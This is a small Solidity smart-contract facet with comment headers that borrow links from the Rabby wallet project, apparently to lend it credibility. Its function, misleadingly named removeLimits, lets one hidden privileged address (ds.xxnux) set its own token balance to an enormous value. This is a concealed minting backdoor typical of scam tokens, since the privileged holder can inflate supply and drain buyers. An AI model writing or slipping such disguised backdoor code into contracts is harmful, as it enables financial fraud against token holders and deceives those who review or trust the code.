/*
 * SPDX-License-Identifier: MIT
 * Website: https://rabby.io/?utm_source=icodrops
 * Github: https://github.com/RabbyHub/Rabby
 * Twitter: https://twitter.com/Rabby_io
 * Medium: https://medium.com/@rabby_io
 * Discord: https://discord.gg/seFBCWmUre
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
